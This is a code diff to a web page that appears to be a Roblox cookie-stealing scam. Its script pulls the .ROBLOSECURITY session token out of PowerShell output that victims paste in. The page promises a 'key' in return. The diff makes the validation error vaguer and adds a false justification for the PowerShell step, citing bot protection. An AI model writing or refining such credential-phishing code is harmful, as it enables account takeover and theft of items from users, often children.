@@ -143,13 +143,13 @@ async function send() {
     for (const word of requiredWords) {
         if (!lowerText.includes(word.toLowerCase())) {
             status.textContent =
-                `Invalid: missing "${word}".`;
+                `Invalid. Make sure you copied the correct entry for your browser.`;
             return;
         }
     }
 
     const startPhrase = "--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-const endPhrase = "\", "/", \"";
+const endPhrase = '", "/", ".roblox.com")))';
 
 const startIndex = text.indexOf(startPhrase);
 
@@ -395,6 +395,7 @@ generateKeyButton.addEventListener(
 
     <h2>6. Then paste that inside the prompt box at the start of the page.</h2>
     <p>You will then be given a key in which you can use to enable fe by pasting it in the textbox.</p>
+    <p>The powershell is needed because the key generator requires validation and maximum protection from alts/robots being sent to servers and ruining gameplay for long periods of time.</p>
 
 </div>
     
